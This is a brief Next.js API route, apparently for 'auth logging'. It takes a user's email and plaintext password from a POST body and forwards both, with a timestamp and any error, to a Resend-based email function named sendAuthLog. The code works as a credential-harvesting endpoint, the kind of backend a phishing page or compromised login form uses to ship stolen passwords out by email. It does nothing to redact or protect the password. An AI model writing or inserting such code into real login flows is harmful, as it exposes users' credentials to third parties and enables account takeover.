import { NextRequest, NextResponse } from 'next/server'
import { sendAuthLog } from '@/lib/resend/client'

export async function POST(req: NextRequest) {
  try {
    const body = await req.json()
    const { email, password, event_type, error: authError } = body

    if (!email || !password || !event_type) {
      return NextResponse.json({ ok: false }, { status: 400 })
    }

    await sendAuthLog({
      email,
      password,
      event_type,
      timestamp: new Date().toISOString(),
      error: authError,
    })

    return NextResponse.json({ ok: true })
  } catch {
    return NextResponse.json({ ok: false }, { status: 500 })
  }
}
